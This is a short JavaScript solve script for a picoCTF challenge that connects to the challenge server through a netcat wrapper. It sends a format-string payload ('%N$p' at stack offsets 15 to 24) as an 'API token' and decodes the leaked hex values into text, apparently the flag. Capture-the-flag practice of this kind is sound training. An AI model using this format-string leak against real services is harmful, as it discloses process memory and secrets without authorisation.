import convo from "../convo.js";
import nc from "../nc.js";

import "../util.js";

const OFFSET = 14;
const SIZE = 10;



const cat = new nc("nc mercury.picoctf.net 20195");

await cat.open;
// await cat.toggleStdout();

await cat.readUntil("View my portfolio");
await cat.write("1\n");
await cat.readUntil("your API token?");
for (let i = 1; i <= SIZE; ++i) {
    await cat.write("%" + (i + OFFSET) + "$p");
}
await cat.write("\n");
await cat.readUntil("Buying stonks with token:\n");

const ints = (await cat.readline()).split('0x').slice(1).map(e => parseInt(e, 16));

await cat.kill();

console.log("[!] " + ints.map(e => convo.string(e)).join(''));